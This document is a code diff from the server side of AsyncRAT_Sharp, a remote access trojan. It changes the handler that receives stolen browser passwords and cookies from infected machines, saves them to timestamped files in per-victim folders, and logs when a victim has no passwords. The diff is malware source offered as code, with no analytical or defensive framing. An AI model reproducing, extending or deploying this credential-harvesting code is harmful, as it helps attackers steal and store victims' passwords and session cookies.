@@ -18,11 +18,20 @@ namespace AsyncRAT_Sharp.Handle_Packet
             try
             {
                 string fullPath = Path.Combine(Application.StartupPath, "ClientsFolder\\" + client.ID + "\\Recovery");
-                if (!Directory.Exists(fullPath))
-                    Directory.CreateDirectory(fullPath);
-                File.WriteAllText(fullPath + "\\Password_" + DateTime.Now.ToString("MM-dd-yyyy HH;mm;ss") + ".txt", unpack_msgpack.ForcePathObject("Password").AsString.Replace("\n", Environment.NewLine));
-                File.WriteAllText(fullPath + "\\Cookies_" + DateTime.Now.ToString("MM-dd-yyyy HH;mm;ss") + ".txt", unpack_msgpack.ForcePathObject("Cookies").AsString.Replace("\n", Environment.NewLine));
-                new HandleLogs().Addmsg($"Client {client.ClientSocket.RemoteEndPoint.ToString().Split(':')[0]} recovered passwords successfully", Color.Purple);
+                string pass = unpack_msgpack.ForcePathObject("Password").AsString;
+                string cookies = unpack_msgpack.ForcePathObject("Cookies").AsString;
+                if (!string.IsNullOrWhiteSpace(pass) || !string.IsNullOrWhiteSpace(cookies))
+                {
+                    if (!Directory.Exists(fullPath))
+                        Directory.CreateDirectory(fullPath);
+                    File.WriteAllText(fullPath + "\\Password_" + DateTime.Now.ToString("MM-dd-yyyy HH;mm;ss") + ".txt", pass.Replace("\n", Environment.NewLine));
+                    File.WriteAllText(fullPath + "\\Cookies_" + DateTime.Now.ToString("MM-dd-yyyy HH;mm;ss") + ".txt", cookies.Replace("\n", Environment.NewLine));
+                    new HandleLogs().Addmsg($"Client {client.ClientSocket.RemoteEndPoint.ToString().Split(':')[0]} recovered passwords successfully", Color.Purple);
+                }
+                else
+                {
+                    new HandleLogs().Addmsg($"Client {client.ClientSocket.RemoteEndPoint.ToString().Split(':')[0]} has no passwords", Color.MediumPurple);
+                }
             }
             catch { }
         }
